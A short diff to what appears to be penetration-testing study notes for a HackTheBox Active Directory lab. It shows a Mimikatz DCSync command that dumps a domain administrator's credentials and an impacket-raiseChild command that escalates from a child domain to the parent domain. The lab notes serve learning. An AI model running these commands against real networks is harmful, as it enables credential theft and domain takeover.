@@ -31,4 +31,6 @@ If Success:
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
 Linux:  
+```
 impacket-raiseChild -target-exec 172.16.5.5(dc ip of Parent Domain) LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm(an administrative user in the child domain)
+```
